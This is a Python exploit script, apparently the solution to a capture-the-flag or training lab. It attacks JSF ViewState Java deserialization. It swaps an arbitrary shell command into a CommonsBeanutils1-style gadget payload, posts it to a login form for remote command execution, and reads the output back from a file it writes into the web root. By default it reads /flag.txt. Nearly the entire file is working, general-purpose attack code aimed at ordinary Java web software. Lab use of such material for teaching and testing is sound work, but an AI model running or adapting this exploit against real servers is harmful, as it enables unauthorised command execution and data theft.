#!/usr/bin/env python3
#
# Exploit for the JSF ViewState deserialization lab (see ./README.md).
#
# Usage:
#   python3 solve.py                     read /flag.txt
#   python3 solve.py 'id'                run an arbitrary command
#   python3 solve.py --raw payload.bin   deliver a pre-built serialized payload
#
# The chain lives in payload.template (a pre-generated CommonsBeanutils1-style
# chain: PriorityQueue -> BeanComparator("outputProperties") -> TemplatesImpl).
# It embeds a translet class whose constructor runs the command *synchronously*
# (exec + waitFor), so the request blocks until the command finishes - the same
# property the real report's timing side channel relied on. The command is
# swapped in place through a fixed-length marker, so no Java toolchain is
# needed. Regenerate the template with tools/build.sh; equivalent payload can
# be produced with ysoserial; see README.md.
#
# The command output is written under the deployed web application directory
# and read back over HTTP. The server has no outbound network access.

import base64
import gzip
import http.cookiejar
import os
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
import uuid

TARGET = "http://localhost:8080"
LOGIN = TARGET + "/pages/login.xhtml"
WEBROOT = "/usr/local/tomcat/webapps/ROOT"
HERE = os.path.dirname(os.path.abspath(__file__))

with open(os.path.join(HERE, "payload.template"), "r") as _fh:
    TEMPLATE = "".join(_fh.read().split())

MARKER = re.compile(rb"__CMD__START.*?__CMD__END", re.S)


def build_viewstate(script):
    raw = bytearray(base64.b64decode(TEMPLATE))
    m = MARKER.search(bytes(raw))
    if not m:
        raise SystemExit("[!] payload template is corrupted")
    span = m.end() - m.start()
    if len(script) > span:
        raise SystemExit("[!] command too long (max %d characters)" % span)
    raw[m.start():m.end()] = script.encode() + b" " * (span - len(script))
    return base64.b64encode(gzip.compress(bytes(raw))).decode()


class Session:
    def __init__(self):
        self.jar = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(self.jar))
        self.opener.open(LOGIN, timeout=15).read()

    def post_viewstate(self, viewstate):
        body = "javax.faces.ViewState=" + urllib.parse.quote(viewstate, safe="") \
               + "&loginForm=loginForm"
        req = urllib.request.Request(
            LOGIN, data=body.encode(),
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            method="POST")
        try:
            return self.opener.open(req, timeout=120).status
        except urllib.error.HTTPError as e:
            return e.code

    def get(self, path):
        try:
            return self.opener.open(TARGET + path, timeout=10).read()
        except urllib.error.HTTPError:
            return None


def main():
    args = sys.argv[1:]
    outfile = None

    if args and args[0] == "--raw":
        if len(args) != 2:
            raise SystemExit("usage: solve.py --raw <serialized-payload-file>")
        viewstate = base64.b64encode(gzip.compress(open(args[1], "rb").read())).decode()
    else:
        script = " ".join(args) if args else "cat /flag.txt"
        outfile = "out-%s.txt" % uuid.uuid4().hex[:8]
        script = script + " > " + WEBROOT + "/" + outfile + " 2>&1"
        viewstate = build_viewstate(script)

    sess = Session()
    code = sess.post_viewstate(viewstate)
    print("[*] payload delivered, HTTP %s" % code)

    if outfile is None:
        sys.exit(0)

    # the command finishes before the response returns (waitFor), but poll a
    # few times anyway to stay robust if the write races the response
    out = None
    for _ in range(15):
        out = sess.get("/" + outfile)
        if out is not None:
            break
        time.sleep(0.4)

    print("-" * 46)
    if out:
        sys.stdout.write(out.decode("utf-8", "replace"))
        if not out.endswith(b"\n"):
            print()
    else:
        print("[!] no output at /%s - the command did not produce anything" % outfile)
    print("-" * 46)


if __name__ == "__main__":
    main()
